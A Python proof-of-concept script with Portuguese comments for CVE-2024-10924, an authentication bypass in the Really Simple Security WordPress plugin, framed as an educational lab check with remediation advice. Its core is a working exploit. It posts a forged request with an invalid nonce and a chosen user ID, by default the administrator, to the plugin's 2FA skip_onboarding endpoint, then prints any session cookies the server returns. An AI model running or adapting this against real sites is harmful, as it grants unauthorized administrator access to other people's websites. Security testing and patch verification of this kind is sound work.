#!/usr/bin/env python3
"""
CVE-2024-10924 Proof of Concept & Remediation Guide
Autor: Rafael Soje (https://github.com/rafaelsoje)
Especialização: Segurança da Informação & DevSecOps

AVISO LEGAL / ETHICAL DISCLAIMER:
Este script destina-se EXCLUSIVAMENTE a fins educacionais, testes de segurança autorizados
e auditorias em ambientes laboratoriais controlados. O uso desta ferramenta contra alvos
sem consentimento prévio e explícito é ilegal. O autor não assume responsabilidade pelo uso indevido.

VULNERABILIDADE:
- CVE: CVE-2024-10924
- CVSS: 9.8 (Crítico)
- Software afetado: Really Simple Security (versões < 9.1.2)
- Causa: Falha de autenticação no endpoint REST de 2FA (/reallysimplessl/v1/two_fa/skip_onboarding)
"""

import argparse
import sys
from urllib.parse import unquote, urljoin

try:
    import requests
except ImportError:
    print("[ERRO] Biblioteca 'requests' não instalada. Instale com: pip install -r requirements.txt", file=sys.stderr)
    sys.exit(1)


def test_vulnerability(target_url: str, user_id: int):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    endpoint = urljoin(target_url, "/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding")

    payload = {
        "user_id": user_id,
        "login_nonce": "invalid_nonce",
        "redirect_to": "/wp-admin/"
    }

    print("=" * 70)
    print(" Verificação de Segurança de Laboratório: CVE-2024-10924")
    print(f" Alvo: {target_url} | User ID: {user_id}")
    print("=" * 70)

    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"User-Agent": "SecLab-CVE-2024-10924-Audit/1.0"}
        )

        if response.status_code == 200 and response.cookies:
            print("\n[🚨 VULNERABILIDADE DETECTADA]")
            print("O endpoint REST retornou cookies de autenticação sem validação do nonce!")
            print(f"Status HTTP: {response.status_code}\n")

            cookies = response.cookies.get_dict()
            for idx, (name, val) in enumerate(cookies.items(), 1):
                decoded = unquote(val)
                print(f" Cookie {idx}: {name} = {decoded[:40]}... (truncado)")

            print("\n[RECOMENDAÇÃO DE REMEDIAÇÃO]")
            print("1. Atualize imediatamente o plugin Really Simple Security para a versão 9.1.2 ou superior.")
            print("2. Restrinja o acesso ao endpoint da API REST via Web Application Firewall (WAF) ou Cloudflare WAF.")
        elif response.status_code in (400, 401, 403, 404):
            print(f"\n[✔ SEGURO] O servidor rejeitou a requisição (HTTP {response.status_code}).")
            print("O plugin provavelmente está atualizado ou o endpoint está desabilitado/protegido.")
        else:
            print(f"\n[i] Resposta inesperada do host (HTTP {response.status_code}):")
            print(response.text[:300])

    except requests.RequestException as e:
        print(f"[ERRO] Falha de comunicação: {e}", file=sys.stderr)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Verificador de conformidade e PoC educacional para CVE-2024-10924."
    )
    parser.add_argument("url", help="URL do host WordPress em teste (ex: http://vulnerablewp.thm:8080)")
    parser.add_argument("--user-id", type=int, default=1, help="ID do usuário a verificar (padrão: 1 - Administrador)")
    args = parser.parse_args()

    test_vulnerability(args.url, args.user_id)

